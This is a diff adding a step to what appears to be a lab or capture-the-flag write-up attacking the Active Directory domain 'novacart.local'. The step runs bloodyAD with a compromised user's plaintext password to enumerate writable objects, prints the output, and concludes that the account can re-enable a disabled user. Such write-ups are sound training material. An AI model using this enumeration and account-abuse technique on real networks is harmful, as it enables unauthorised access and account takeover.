@@ -760,5 +760,32 @@ The account is disabled so ill need to re-enable somehow
 So ill run through the writeable objects across my compromised accounts so far
 
 ```python
+bloodyAD --host DC.novacart.local -d novacart.local -u d.barowski -p 'kubarow' get writable
+
+distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=novacart,DC=local
+permission: WRITE
+
+distinguishedName: CN=Jan Bronski,CN=Users,DC=novacart,DC=local
+permission: WRITE
+
+distinguishedName: CN=David Barowski,CN=Users,DC=novacart,DC=local
+permission: WRITE
+
+distinguishedName: CN=J Paul,CN=Users,DC=novacart,DC=local
+permission: WRITE
+
+distinguishedName: CN=M Ruehl,CN=Users,DC=novacart,DC=local
+permission: WRITE
+
+distinguishedName: CN=D Winkler,CN=Users,DC=novacart,DC=local
+permission: WRITE
+
+distinguishedName: CN=Lois Thompson,CN=Users,DC=novacart,DC=local
+permission: WRITE
+```
+So as seen here a previously compromised user is able to re-enable the account of `l.thompson`
+
+
+```python
 
 ```
